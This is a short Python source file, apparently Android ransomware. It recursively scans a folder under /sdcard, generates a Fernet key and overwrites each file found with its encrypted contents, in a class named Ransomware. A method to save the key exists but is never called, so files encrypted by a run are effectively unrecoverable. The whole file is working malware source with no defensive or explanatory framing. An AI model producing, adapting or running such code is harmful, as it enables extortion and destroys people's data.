import os
import sys
from cryptography.fernet import Fernet

dirr = "/sdcard/ransome"
files = []
key = Fernet.generate_key()

def scan_recurse(base_dir):
    result = []  # Solely for debugging purpose
    result.append(base_dir)
    result.append(f"os.scandir: {os.scandir(base_dir)}")
    try:
        for entry in os.scandir(base_dir):
            if entry.is_file():
                yield entry
            else:
                yield from scan_recurse(entry.path)
    except Exception as e:
        return result

def scan_files():
    try:
        for i in scan_recurse(dirr):
            if 'key.key' in i.path:
                continue
            files.append(i.path)
        return f"{len(files)}"
    except Exception as e:
        return f"Exception: {e}"

class Ransomware:
    def __init__(self):
        pass

    def backup_key(self):
        try:
            key_path = '/storage/emulated/0/ransom/key.key'
            with open(key_path, 'wb') as key_file:
                key_file.write(key)
            print("Encryption key backed up to 'key.key'.")
        except IOError as e:
            print("Error backing up key: ", e)

    def encrypt(self):
        for file in files:
            if not os.path.isfile(file):
                print(f"{file} not found or is not a file, skipping.")
                continue
            try:
                with open(file, 'rb') as file_data:
                    data = file_data.read()
                encrypted_data = Fernet(key).encrypt(data)
                print(f'Encrypted: {file}')
                with open(file, 'wb') as file_data:
                    file_data.write(encrypted_data)
            except Exception as e:
                print(f"Error encrypting {file}: {e}")

def main():
    result = []
    a = scan_files()
    result.append(f"len(files): {a}")
    result.append(f"key: {key}")
    # os.system("cd /sdcard/ransom")
    if not files:
        print("No files found to encrypt.")
        result.append("main(): No files found to encrypt.")
    else:
        ransomware = Ransomware()
        ransomware.encrypt()
        result.append("Encrypting...")
    return result

